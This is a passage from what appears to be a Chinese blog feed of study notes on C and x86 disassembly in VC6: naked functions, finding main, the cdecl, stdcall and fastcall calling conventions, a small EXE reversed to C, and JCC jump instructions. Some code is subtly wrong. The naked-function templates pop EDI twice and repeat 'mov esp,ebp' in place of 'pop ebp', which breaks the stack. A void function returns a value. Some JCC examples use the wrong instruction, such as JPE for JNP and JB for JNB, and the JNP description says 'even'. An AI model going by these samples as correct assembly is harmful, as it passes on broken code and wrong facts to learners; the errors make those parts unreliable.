个特殊符号字符、外来语字母和图形符号。</li></ul><p>为什么不是八位二进制呢？因为其第一位都是0，没必要记录，在起初7位已经满足需求。</p>]]></content>
    
    
    
    <tags>
      
      <tag>c与汇编</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>C语言与反汇编学习（二）</title>
    <link href="/2019/10/19/C%E8%AF%AD%E8%A8%80%E4%B8%8E%E5%8F%8D%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <url>/2019/10/19/C%E8%AF%AD%E8%A8%80%E4%B8%8E%E5%8F%8D%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="C语言与反汇编学习（二）"><a href="#C语言与反汇编学习（二）" class="headerlink" title="C语言与反汇编学习（二）"></a>C语言与反汇编学习（二）</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本次主要学习一下c是如何变成汇编的，查找程序入口，调用约定，和主要练习使用__declspec(naked)裸函数实现部分简单的功能和完整的逆一个简单EXE成c语言。</p><h2 id="裸函数"><a href="#裸函数" class="headerlink" title="裸函数"></a>裸函数</h2><h3 id="什么是裸函数？"><a href="#什么是裸函数？" class="headerlink" title="什么是裸函数？"></a>什么是裸函数？</h3><div class="hljs"><pre><code>void __declspec(naked) Function()  {.....}</code></pre></div><p>在代码中申明函数后，编译时，除了入口参数压栈外，然后就是call这个函数，编译器不会为函数体生成任何代码。</p><h3 id="运行裸函数为什么会出错"><a href="#运行裸函数为什么会出错" class="headerlink" title="运行裸函数为什么会出错"></a>运行裸函数为什么会出错</h3><p>以上的裸函数运行后，因为编译器除了入口参数压栈外，然后就是call这个函数，不会给其生成任何的汇编代码，所以明显运行后其无法回到原来的主函数，然后堆栈是不平衡的。所以：</p><div class="hljs"><pre><code>void __declspec(naked) Function()  {    __asm ret}</code></pre></div><p>加一个ret就好了，不会再报错了。</p><h3 id="裸函数框架简单集合"><a href="#裸函数框架简单集合" class="headerlink" title="裸函数框架简单集合"></a>裸函数框架简单集合</h3><h4 id="无参数无返回值的函数框架"><a href="#无参数无返回值的函数框架" class="headerlink" title="无参数无返回值的函数框架"></a>无参数无返回值的函数框架</h4><div class="hljs"><pre><code>void __declspec(naked) Function()  {    __asm    {        push ebp        mov ebp,esp        sub esp,0x40        push ebx        push esi        push edi        lea edi,dword ptr ds:[ebp-0x40]        mov eax,0xCCCCCCCC        mov ecx,0x10        rep stosd        pop edi        pop edi        pop esi        pop ebx        mov esp,ebp        mov esp,ebp        ret    }}</code></pre></div><h4 id="有参数有返回值的函数框架"><a href="#有参数有返回值的函数框架" class="headerlink" title="有参数有返回值的函数框架"></a>有参数有返回值的函数框架</h4><div class="hljs"><pre><code>void __declspec(naked) Function()  {    __asm    {        push ebp        mov ebp,esp        sub esp,0x40        push ebx        push esi        push edi        lea edi,dword ptr ds:[ebp-0x40]        mov eax,0xCCCCCCCC        mov ecx,0x10        rep stosd        //主要功能        mov eax,dword ptr ds:[ebp+8]        add eax,dword ptr ds:[ebp+0xC]        pop edi        pop edi        pop esi        pop ebx        mov esp,ebp        mov esp,ebp        ret    }}</code></pre></div><h4 id="带局部变量的函数框架"><a href="#带局部变量的函数框架" class="headerlink" title="带局部变量的函数框架"></a>带局部变量的函数框架</h4><div class="hljs"><pre><code>void __declspec(naked) Function()  {    __asm    {        push ebp        mov ebp,esp        sub esp,0x40        push ebx        push esi        push edi        lea edi,dword ptr ds:[ebp-0x40]        mov eax,0xCCCCCCCC        mov ecx,0x10        rep stosd        //主要功能        mov dword ptr ds:[ebp-4],2        mov dword ptr ds:[ebp-8],3        mov eax,dword ptr ds:[ebp+8]        add eax,dword ptr ds:[ebp+0xC]        //注意汇编中局部变量的存放办法            pop edi        pop edi        pop esi        pop ebx        mov esp,ebp        mov esp,ebp        ret    }}</code></pre></div><p><strong>在练习中发现对局部变量在汇编中如何存放，如何体现有些生疏，特此记录一下。</strong></p><h3 id="针对裸函数的练习"><a href="#针对裸函数的练习" class="headerlink" title="针对裸函数的练习"></a>针对裸函数的练习</h3><p>目标是要实现以下功能：</p><div class="hljs"><pre><code>int plus(int x,int y,int z){    int a = 2;    int b = 3;    int c = 4;    return x+y+z+a+b+c;}</code></pre></div><p>代码：</p><div class="hljs"><pre><code>// Day2.cpp : Defines the entry point for the console application.//#include &quot;stdafx.h&quot;int __declspec(naked)  plus(int x,int y,int z){    __asm    {        push ebp        mov ebp,esp        sub esp,0x40    //开栈        push ebx        push esi        push edi        //保护现场        lea edi,dword ptr ds:[ebp-0x40]        mov ecx,0x10        mov eax,0xCCCCCCCC        rep stosd        //为缓冲区填充数据        //真正要执行的功能        //局部变量：EBP—4开始 参数：ebp+8开始        //ebp+4是eip 原来call下条语句        mov eax,0x2        mov dword ptr ds:[ebp-0x4],eax        mov eax,0x3        mov dword ptr ds:[ebp-0x8],eax        mov eax,0x4        mov dword ptr ds:[ebp-0x0C],eax  //放入局部变量        mov eax,dword ptr ds:[ebp+0x8]        add eax,dword ptr ds:[ebp+0x0C]        add eax,dword ptr ds:[ebp+0x10]        add eax,dword ptr ds:[ebp-0x4]        add eax,dword ptr ds:[ebp-0x8]        add eax,dword ptr ds:[ebp-0x0C]         mov dword ptr ds:[ebp-0x4],eax    //把计算结果放入栈中，下面主函数打印a时要用到        pop edi;        pop esi;        pop ebx;        mov esp,ebp        pop ebp        ret    }}int main(int argc, char* argv[]){    int a;    a=plus(6,7,8);    printf(&quot;%d\n&quot;,a);    return 0;}</code></pre></div><p>练习这个可以更加熟悉堆栈结构，参数、局部变量的位置。</p><h2 id="程序真正的入口"><a href="#程序真正的入口" class="headerlink" title="程序真正的入口"></a>程序真正的入口</h2><p>main 或WinMain 是“语法规定的用户入口”，而不是“应用程序入口”。应用程序入口通常是启动函数。</p><p>在OD中默认设置就是到winmain入口就暂停程序，其并不是主函数入口。其实每一种编译器都有自己一套的编译标准，在主函数启动前要做一些必要的准备工作，下面我分析的是vc6.0的。</p><h3 id="main-函数的识别与寻找"><a href="#main-函数的识别与寻找" class="headerlink" title="main 函数的识别与寻找"></a>main 函数的识别与寻找</h3><p><strong>只是vc++6.0</strong><br>main 函数被调用前要先调用的函数如下：</p><ul><li>GetVersion() </li><li>_heap_init() </li><li>GetCommandLineA() </li><li>_crtGetEnvironmentStringsA() </li><li>_setargv()</li><li>_setenvp()</li><li>_cinit()</li></ul><p><img src="/2019/10/19/C语言与反汇编学习（二）/images/15715025630158.jpg" srcset="/img/loading.gif" alt="-w414"><br>这些函数调用结束后就会调用main 函数，根据main 函数调用的特征，将3个参数压入栈内作为函数的参数。<br>所以在winmain停下后，可以一直单步调试，遇到call的时候，注意前方是不是有3个参数被压入栈了，是的话这个可以基本判断它call的就是main函数直接步过进去即可，但是这个也不是一定的，结合智能od的注释，注释有win内核函数调用就不要进入函数就可以了。</p><h2 id="函数调用约定"><a href="#函数调用约定" class="headerlink" title="函数调用约定"></a>函数调用约定</h2><p>常见的几种约定：<br><img src="/2019/10/19/C语言与反汇编学习（二）/images/15715066318478.jpg" srcset="/img/loading.gif" alt="-w355"></p><h3 id="cdecl"><a href="#cdecl" class="headerlink" title="cdecl"></a>cdecl</h3><p>使用VC++ (关闭优化选项)编译代码生成cdecl.exe文件后，使用OllyDbg调试:函数的参数1、2以逆序方式压人栈，<br>调用Plus(函数( 401014)后，使用ADD ESP,8命令整理栈。调用者main()函数直接清理其压入栈的函数参数，这样的方式即是cdecl。<br><img src="/2019/10/19/C语言与反汇编学习（二）/images/15715038333622.jpg" srcset="/img/loading.gif" alt="-w267"></p><h3 id="stdcall"><a href="#stdcall" class="headerlink" title="stdcall"></a>stdcall</h3><p>stdcall常用于win32 api，在往后的VB中很常见。这个是自身函数内部进行栈清理。若想使用stdcall方式编译源码，只要使用<code>_ stdcall</code>关键字即可。<br><img src="/2019/10/19/C语言与反汇编学习（二）/images/15715038140613.jpg" srcset="/img/loading.gif" alt="-w295"><br>栈的清理工作由add(函数中最后( 40100F)的RETN 8命令来执行。RETN 8命令的含义为RETN+POP 8字节，即返回后使ESP增加到指定大小。</p><p>像这样在被调用者add)函数内部清理栈的方式即为stdcall方式。stdcall方式的好处在于， <strong>被调用者函数内部存在着栈清理代码，与每次调用函数时都要用ADD ESP,XXX命令的cdecI方式相比，代码尺寸要小</strong>。</p><p><strong>虽然Win 32 API是使用C语言编写的库，但它使用的是stdcall方式，而不是C语言默认的cdecl方式。</strong>这是为了获得更好的兼容性，使C语言之外的其他语言( Delphi(Pascal)、Visual Basic等)也能直接调用API。</p><h3 id="fastcall"><a href="#fastcall" class="headerlink" title="fastcall"></a>fastcall</h3><p>fastcal方式与stdcall方式基本类似，但该方式通常会使用寄存器(而非栈内存)去传递那些需要传递给函数的部分参数(前2个)。若某函数有4个参数，则前2个参数分别使用ECX、EDX寄存器传递。</p><p>顾名思义，fastcall方式的优势在于可以实现对函数的快速调用(从CPU的立场看，访问寄存器的速度要远比内存快得多)。单从函数调用本身来看，fastcall方式非常快，但是有时需要额外的系统开销来管理ECX、EDX寄存器。倘若调用函数前ECX与EDX中存有重要数据，那么使用它们前必须先备份。此外,如果函数本身很复杂，需要把ECX、EDX寄存器用作其他用途时，也需要将它们中的参数值存储到另外某个地方。有舍也有得。</p><p><img src="/2019/10/19/C语言与反汇编学习（二）/images/15715042971030.jpg" srcset="/img/loading.gif" alt="-w292"><br>就跟这种情况，一定要注意其是直接用寄存器来传参和计算的，不涉及栈，不过这个不常用。<br><img src="/2019/10/19/C语言与反汇编学习（二）/images/15715043849420.jpg" srcset="/img/loading.gif" alt="-w330"><br>这个就是常用的情况，传参的时候会把部分的参数用寄存器来传。</p><h2 id="第一次完整逆一个exe（CallingConvention-exe）"><a href="#第一次完整逆一个exe（CallingConvention-exe）" class="headerlink" title="第一次完整逆一个exe（CallingConvention.exe）"></a>第一次完整逆一个exe（CallingConvention.exe）</h2><h3 id="汇编分析"><a href="#汇编分析" class="headerlink" title="汇编分析"></a>汇编分析</h3><p><img src="/2019/10/19/C语言与反汇编学习（二）/images/15715046760959.jpg" srcset="/img/loading.gif" alt="-w855"><br>简单一看，这个就是停在winmain入口了，注意寻找前面所说的那个找call之前有3个参数压栈最为函数参数的语句，一直单步走：<br><img src="/2019/10/19/C语言与反汇编学习（二）/images/15715049691652.jpg" srcset="/img/loading.gif" alt="-w679"><br>疑似出现符合的情况，这时候按<code>F7</code>进去查看内部：<br><img src="/2019/10/19/C语言与反汇编学习（二）/images/15715050273427.jpg" srcset="/img/loading.gif" alt="-w535"><br>简单一看，就是我们要找的main函数。<br><strong>接下来为了加强分析可观性，我把汇编代码都放进了WPS中进行分析</strong>：<br><img src="/2019/10/19/C语言与反汇编学习（二）/images/15715051301041.jpg" srcset="/img/loading.gif" alt="-w1307"><br><img src="/2019/10/19/C语言与反汇编学习（二）/images/15715051770389.jpg" srcset="/img/loading.gif" alt="-w1311"><br><img src="/2019/10/19/C语言与反汇编学习（二）/images/15715052426371.jpg" srcset="/img/loading.gif" alt="-w1254"><br>（箭头指的不是特别好……）</p><h3 id="逆成c代码"><a href="#逆成c代码" class="headerlink" title="逆成c代码"></a>逆成c代码</h3><div class="hljs"><pre><code>#include &quot;stdafx.h&quot;int __stdcall plus2(int a,int b,int c){    return a+b+c;}int __cdecl plus3(int a,int b){    return a+b;}int __fastcall plus(int a,int b,int c,int d,int e){    int z,s;    z=plus2(a,b,c);    s=plus3(b,a);    return plus3(z,s);}int main(int argc, char* argv[]){    int x;    x=plus(1,3,4,6,7);    printf(&quot;%d\n&quot;,x);    return 0;}</code></pre></div><p>这个练习过程其实是十分艰难的，我分析了有一个小时左右，主要是</p><ul><li>开始对局部变量有些生疏，函数内部定义一个变量后汇编中会如何显示、</li><li>fastcall的认识不是很好</li><li>传入的<code>6 7</code>做了什么也不是很清楚<br>最后结合ida生成的伪代码才完成，不过经过这个练习都学到了很多，使用ida也感受到了ida的强大，学到了在其中如何看一些简单的函数以及其与真正汇编代码的区别。</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>c与汇编</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>C语言与反汇编学习（一）</title>
    <link href="/2019/10/19/C%E8%AF%AD%E8%A8%80%E4%B8%8E%E5%8F%8D%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <url>/2019/10/19/C%E8%AF%AD%E8%A8%80%E4%B8%8E%E5%8F%8D%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="C语言与反汇编学习（一）"><a href="#C语言与反汇编学习（一）" class="headerlink" title="C语言与反汇编学习（一）"></a>C语言与反汇编学习（一）</h1><h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>本课主要学习VC开发环境的简单使用，和几个函数反汇编分析。</p><h2 id="简单下熟悉VC6开发环境"><a href="#简单下熟悉VC6开发环境" class="headerlink" title="简单下熟悉VC6开发环境"></a>简单下熟悉VC6开发环境</h2><p>这里我直接用了编程达人的vc虚拟机，官方的vc6.0不是很好用，每次只支持调试一次，人家的可以突破这个限制。</p><h3 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h3><p><img src="/2019/10/19/C语言与反汇编学习（一）/images/15714523427592.jpg" srcset="/img/loading.gif" alt="-w911"></p><h3 id="执行过程"><a href="#执行过程" class="headerlink" title="执行过程"></a>执行过程</h3><p>代码编写–&gt;生成EXE(F7)–&gt;运行(F5)–&gt;结束运行(Shift+F5)</p><h3 id="一些简单操作"><a href="#一些简单操作" class="headerlink" title="一些简单操作"></a>一些简单操作</h3><h4 id="设置断点"><a href="#设置断点" class="headerlink" title="设置断点"></a>设置断点</h4><p><strong>设置断点</strong>是光标放到哪行代码后按下<code>F9</code>即可，这也是后面很多操作的最重要的起初操作。<br><img src="/2019/10/19/C语言与反汇编学习（一）/images/15714525807811.jpg" srcset="/img/loading.gif" alt="-w338"></p><h4 id="调出寄存器，栈，内存窗口"><a href="#调出寄存器，栈，内存窗口" class="headerlink" title="调出寄存器，栈，内存窗口"></a>调出寄存器，栈，内存窗口</h4><p><strong>调出寄存器，栈，内存窗口</strong><img src="/2019/10/19/C语言与反汇编学习（一）/images/15714528282225.jpg" srcset="/img/loading.gif" alt="-w586"><br>看图，在空白处右击点击一下你需要的窗口就好了。<br><img src="/2019/10/19/C语言与反汇编学习（一）/images/15714528997602.jpg" srcset="/img/loading.gif" alt="-w526"></p><h4 id="进入反汇编窗口"><a href="#进入反汇编窗口" class="headerlink" title="进入反汇编窗口"></a>进入反汇编窗口</h4><p>在程序运行时，且有适当断点的时候，看图<br><img src="/2019/10/19/C语言与反汇编学习（一）/images/15714530279259.jpg" srcset="/img/loading.gif" alt="-w517"></p><p>右击程序框内的空白处，然后点击GO to Disassembly 就好了。在这里面最重要的操作就是：<code>F10 F11</code>分别是步过和步入。这个跟od里不一样。</p><h2 id="C语言的调用"><a href="#C语言的调用" class="headerlink" title="C语言的调用"></a>C语言的调用</h2><p>1、无参数，无返回值的函数调用<br>2、有参数，无返回值的函数调用<br>3、无参数，有返回值的函数调用<br>4、有参数，有返回值的函数调用</p><h2 id="函数的反汇编分析-空函数"><a href="#函数的反汇编分析-空函数" class="headerlink" title="函数的反汇编分析-空函数"></a>函数的反汇编分析-空函数</h2><h3 id="先上c："><a href="#先上c：" class="headerlink" title="先上c："></a>先上c：</h3><div class="hljs"><pre><code>#include &quot;stdafx.h&quot;void Function(){}int main(int argc, char* argv[]){    Function()    return 0;}</code></pre></div><h3 id="反汇编分析："><a href="#反汇编分析：" class="headerlink" title="反汇编分析："></a>反汇编分析：</h3><p><img src="/2019/10/19/C语言与反汇编学习（一）/images/15714535234194.jpg" srcset="/img/loading.gif" alt="-w438"></p><h2 id="函数的反汇编分析-简单功能"><a href="#函数的反汇编分析-简单功能" class="headerlink" title="函数的反汇编分析-简单功能"></a>函数的反汇编分析-简单功能</h2><h3 id="两个数相加："><a href="#两个数相加：" class="headerlink" title="两个数相加："></a>两个数相加：</h3><h4 id="c代码："><a href="#c代码：" class="headerlink" title="c代码："></a>c代码：</h4><div class="hljs"><pre><code>#include &quot;stdafx.h&quot;void Plus(int x,int y){    return x+y;}int main(int argc, char* argv[]){    Plus(2,1);    return 0;}</code></pre></div><h4 id="反汇编分析：-1"><a href="#反汇编分析：-1" class="headerlink" title="反汇编分析："></a>反汇编分析：</h4><p><img src="/2019/10/19/C语言与反汇编学习（一）/images/15714537632825.jpg" srcset="/img/loading.gif" alt="-w709"></p><h3 id="三个数相加："><a href="#三个数相加：" class="headerlink" title="三个数相加："></a>三个数相加：</h3><h4 id="c代码：-1"><a href="#c代码：-1" class="headerlink" title="c代码："></a>c代码：</h4><div class="hljs"><pre><code>#include &quot;stdafx.h&quot;void Plus(int x,int y，int z){    return x+y;}int main(int argc, char* argv[]){    Plus(2,1,3);    return 0;}</code></pre></div><h4 id="反汇编分析：-2"><a href="#反汇编分析：-2" class="headerlink" title="反汇编分析："></a>反汇编分析：</h4><p><img src="/2019/10/19/C语言与反汇编学习（一）/images/15714539277702.jpg" srcset="/img/loading.gif" alt="-w974"><br>（和上面那个基本一样，只是为了练习，不详细写了）</p><h2 id="函数的反汇编分析-嵌套调用"><a href="#函数的反汇编分析-嵌套调用" class="headerlink" title="函数的反汇编分析-嵌套调用"></a>函数的反汇编分析-嵌套调用</h2><p>要求：编写一个函数，能够实现对任意5个整数实现加法(使用Plus1和Plus2).</p><h3 id="c代码"><a href="#c代码" class="headerlink" title="c代码"></a>c代码</h3><div class="hljs"><pre><code>#include &quot;stdafx.h&quot;int Plus1(int x,int y){    return x+y;}int Plus2(int x,int y,int z){    return x+y+z;}int Plus3(int a,int b,int c,int d,int e){    int i,j,m;    i=Plus1(a,b);    j=Plus2(c,d,e);    m=Plus1(i,j);    return m;}int main(int argc, char* argv[]){    Plus3(2,1,3,1,5);    return 0;}</code></pre></div><h3 id="反汇编分析：-3"><a href="#反汇编分析：-3" class="headerlink" title="反汇编分析："></a>反汇编分析：</h3><p><img src="/2019/10/19/C语言与反汇编学习（一）/images/15714541318519.jpg" srcset="/img/loading.gif" alt="-w1534"><br>（中间调用一个Plus1 和 Plus2，就不必进入分析了，基本跟前面简单分析那两个一样，这个练习是顺成下来的。）</p><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>学完汇编了，就接着C与汇编结合分析，步步把常见的结合分析完。这次学习与练习，可以一整段一整段的读汇编代码了，<strong>（这个前面其实还有画过堆栈图，当时是一句句分析学习的，为了熟悉堆栈和汇编语句，找时间补下笔记</strong>）也熟悉了函数是如何嵌套调用的。</p>]]></content>
    
    
    
    <tags>
      
      <tag>c与汇编</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JCC学习</title>
    <link href="/2019/10/07/JCC/"/>
    <url>/2019/10/07/JCC/</url>
    
    <content type="html"><![CDATA[<h1 id="JCC学习"><a href="#JCC学习" class="headerlink" title="JCC学习"></a>JCC学习</h1><h2 id="JCC指令集合"><a href="#JCC指令集合" class="headerlink" title="JCC指令集合"></a>JCC指令集合</h2><h3 id="详细"><a href="#详细" class="headerlink" title="详细__"></a>详细__</h3><p>1、JE, JZ　　　　　　结果为零则跳转(相等时跳转)　　　　 　　 ZF=1</p><p>2、JNE, JNZ　　  　　结果不为零则跳转(不相等时跳转) 　　　　   ZF=0</p><p>3、JS　　　　　　　  结果为负则跳转　　　　　　　　　　　　    SF=1</p><p>4、JNS 　　　　　　  结果为非负则跳转　　　　　　　　　　　   SF=0</p><p>5、JP, JPE　　　　　 结果中1的个数为偶数则跳转　　　　　　      PF=1</p><p>6、JNP, JPO　　　　  结果中1的个数为偶数则跳转　　　　　　      PF=0</p><p>7、JO　　　　　　　  结果溢出了则跳转　　　　　　　　　　      OF=1</p><p>8、JNO 　　　　　　  结果没有溢出则跳转　　　　　　　　            OF=0</p><p>9、JB, JNAE 　　　　 小于则跳转 (无符号数)　　　　　　　　　   CF=1</p><p>10、JNB, JAE 　　　  大于等于则跳转 (无符号数)　　　　　　　   CF=0</p><p>11、JBE, JNA  　　　 小于等于则跳转 (无符号数)　　　　　　　  CF=1 or ZF=1</p><p>12、JNBE, JA 　　　  大于则跳转(无符号数)　　　　　　　　　  CF=0 and ZF=0</p><p>13、JL, JNGE 　　　  小于则跳转 (<strong>有符号数</strong>)　　　　　　　　    SF≠ OF</p><p>14、JNL, JGE　　　   大于等于则跳转 (<strong>有符号数</strong>)　　　　　　    SF=OF</p><p>15、JLE, JNG  　　　 小于等于则跳转 (<strong>有符号数</strong>)　　　　　　    ZF=1 or SF≠ OF</p><p>16、JNLE, JG 　　　  大于则跳转(<strong>有符号数</strong>)　　　　　　　　     ZF=0 and SF=OF</p><h3 id="表格总结"><a href="#表格总结" class="headerlink" title="表格总结"></a>表格总结</h3><p><img src="/2019/10/07/JCC/images/15713086707312.jpg" srcset="/img/loading.gif" alt="-w1067"></p><p>直接摘抄的做的很详细，正好有助记，但是需要和上面详细指令搭配使用，要<strong>注意那些有符号的JCC跳转指令，</strong>因为在这个表里没有体现。也不用太着急背，熟悉一下就可以了，有部分是可以直接记住的，在往后遇到模糊的直接查下就可以了。</p><h3 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h3><p><strong>JCC指令决定它跳不跳转跟别的没关系，只跟EFLAG标志寄存器有关系，根据符号位来进行跳转的</strong></p><h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><h3 id="使用汇编指令修改标志寄存器中的某个位的值，实现JCC的十六种跳转"><a href="#使用汇编指令修改标志寄存器中的某个位的值，实现JCC的十六种跳转" class="headerlink" title="使用汇编指令修改标志寄存器中的某个位的值，实现JCC的十六种跳转."></a>使用汇编指令修改标志寄存器中的某个位的值，实现JCC的十六种跳转.</h3><p>前提：能用CMP和TEST实现的优先考虑.</p><h4 id="1、JE-JZ-结果为零则跳转-相等时跳转-ZF-1"><a href="#1、JE-JZ-结果为零则跳转-相等时跳转-ZF-1" class="headerlink" title="1、JE, JZ 结果为零则跳转(相等时跳转) ZF=1"></a>1、JE, JZ 结果为零则跳转(相等时跳转) ZF=1</h4><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">AL</span>,<span class="hljs-number">1</span><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">CL</span>,<span class="hljs-number">1</span><span class="hljs-keyword">CMP</span> <span class="hljs-built_in">AL</span>,<span class="hljs-built_in">CL</span><span class="hljs-keyword">JE</span> <span class="hljs-number">0X0040102B</span></code></pre></div><h4 id="2、JNE-JNZ-结果不为零则跳转-不相等时跳转-ZF-0"><a href="#2、JNE-JNZ-结果不为零则跳转-不相等时跳转-ZF-0" class="headerlink" title="2、JNE, JNZ 结果不为零则跳转(不相等时跳转) ZF=0"></a>2、JNE, JNZ 结果不为零则跳转(不相等时跳转) ZF=0</h4><div class="hljs"><pre><code class="hljs undefined">MOV AL,1<span class="hljs-keyword">TEST </span>AL,ALJNZ 0X00401006</code></pre></div><h4 id="3、-JS-结果为负则跳转-SF-1"><a href="#3、-JS-结果为负则跳转-SF-1" class="headerlink" title="3、 JS 结果为负则跳转 SF=1"></a>3、 JS 结果为负则跳转 SF=1</h4><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">AL</span>,<span class="hljs-number">1</span><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">CL</span>,<span class="hljs-number">2</span><span class="hljs-keyword">CMP</span> <span class="hljs-built_in">AL</span>,<span class="hljs-built_in">CL</span></code></pre></div><h4 id="4、-JNS-结果为非负则跳转-SF-0"><a href="#4、-JNS-结果为非负则跳转-SF-0" class="headerlink" title="4、 JNS 结果为非负则跳转 SF=0"></a>4、 JNS 结果为非负则跳转 SF=0</h4><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-keyword">XOR</span> <span class="hljs-built_in">EAX</span>,<span class="hljs-built_in">EAX</span><span class="hljs-keyword">JNS</span> <span class="hljs-number">0X0040102F</span></code></pre></div><h4 id="5、-JP-JPE-结果中1的个数为偶数则跳转-PF-1"><a href="#5、-JP-JPE-结果中1的个数为偶数则跳转-PF-1" class="headerlink" title="5、 JP, JPE 结果中1的个数为偶数则跳转 PF=1"></a>5、 JP, JPE 结果中1的个数为偶数则跳转 PF=1</h4><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">AL</span>,<span class="hljs-number">2</span><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">CL</span>,<span class="hljs-number">2</span><span class="hljs-keyword">CMP</span> <span class="hljs-built_in">AL</span>,<span class="hljs-built_in">CL</span><span class="hljs-keyword">JPE</span> <span class="hljs-number">0X00401008</span></code></pre></div><h4 id="6、JNP-JPO-结果中1的个数为奇数则跳转-PF-0"><a href="#6、JNP-JPO-结果中1的个数为奇数则跳转-PF-0" class="headerlink" title="6、JNP, JPO 结果中1的个数为奇数则跳转 PF=0"></a>6、JNP, JPO 结果中1的个数为奇数则跳转 PF=0</h4><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">AL</span>,<span class="hljs-number">2</span><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">CL</span>,<span class="hljs-number">1</span><span class="hljs-keyword">CMP</span> <span class="hljs-built_in">AL</span>,<span class="hljs-built_in">CL</span><span class="hljs-keyword">JPE</span> <span class="hljs-number">0X00401008</span></code></pre></div><h4 id="7、-JO-结果溢出了则跳转-OF-1"><a href="#7、-JO-结果溢出了则跳转-OF-1" class="headerlink" title="7、 JO 结果溢出了则跳转 OF=1"></a>7、 JO 结果溢出了则跳转 OF=1</h4><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">AL</span>,<span class="hljs-number">80</span><span class="hljs-keyword">SUB</span> <span class="hljs-built_in">AL</span>,<span class="hljs-number">10</span><span class="hljs-keyword">JO</span> <span class="hljs-number">0X00401008</span></code></pre></div><h4 id="8、-JNO-结果没有溢出则跳转-OF-0"><a href="#8、-JNO-结果没有溢出则跳转-OF-0" class="headerlink" title="8、 JNO 结果没有溢出则跳转 OF=0"></a>8、 JNO 结果没有溢出则跳转 OF=0</h4><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">AX</span>,0FFFF<span class="hljs-keyword">ADD</span> <span class="hljs-built_in">AX</span>,<span class="hljs-number">80</span><span class="hljs-keyword">JNO</span> <span class="hljs-number">0X00401010</span></code></pre></div><h4 id="9、-JB-JNAE-小于则跳转-无符号数-CF-1"><a href="#9、-JB-JNAE-小于则跳转-无符号数-CF-1" class="headerlink" title="9、 JB, JNAE 小于则跳转 (无符号数) CF=1"></a>9、 JB, JNAE 小于则跳转 (无符号数) CF=1</h4><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">AX</span>,<span class="hljs-number">80</span><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">CX</span>,<span class="hljs-number">90</span><span class="hljs-keyword">CMP</span> <span class="hljs-built_in">AX</span>,<span class="hljs-built_in">CX</span><span class="hljs-keyword">JB</span> <span class="hljs-number">0X0040103E</span></code></pre></div><h4 id="10、-JNB-JAE-大于等于则跳转-无符号数-CF-0"><a href="#10、-JNB-JAE-大于等于则跳转-无符号数-CF-0" class="headerlink" title="10、 JNB, JAE 大于等于则跳转 (无符号数) CF=0"></a>10、 JNB, JAE 大于等于则跳转 (无符号数) CF=0</h4><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">AX</span>,<span class="hljs-number">80</span><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">CX</span>,<span class="hljs-number">90</span><span class="hljs-keyword">CMP</span> <span class="hljs-built_in">CX</span>,<span class="hljs-built_in">AX</span><span class="hljs-keyword">JB</span> <span class="hljs-number">0X00401044</span></code></pre></div><h4 id="11、-JBE-JNA-小于等于则跳转-无符号数-CF-1-or-ZF-1"><a href="#11、-JBE-JNA-小于等于则跳转-无符号数-CF-1-or-ZF-1" class="headerlink" title="11、 JBE, JNA 小于等于则跳转 (无符号数) CF=1 or ZF=1"></a>11、 JBE, JNA 小于等于则跳转 (无符号数) CF=1 or ZF=1</h4><p>一种直接跟练习9一样直接构造让CF=1或者让跟练习1让ZF=0就可以了。</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">AL</span>,<span class="hljs-number">1</span><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">CL</span>,<span class="hljs-number">1</span><span class="hljs-keyword">CMP</span> <span class="hljs-built_in">AL</span>,<span class="hljs-built_in">CL</span><span class="hljs-keyword">JE</span> <span class="hljs-number">0X0040102B</span></code></pre></div><p>或者</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">AX</span>,<span class="hljs-number">80</span><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">CX</span>,<span class="hljs-number">90</span><span class="hljs-keyword">CMP</span> <span class="hljs-built_in">AX</span>,<span class="hljs-built_in">CX</span><span class="hljs-keyword">JB</span> <span class="hljs-number">0X0040103E</span></code></pre></div><h4 id="12、-JNBE-JA-大于则跳转-无符号数-CF-0-and-ZF-0"><a href="#12、-JNBE-JA-大于则跳转-无符号数-CF-0-and-ZF-0" 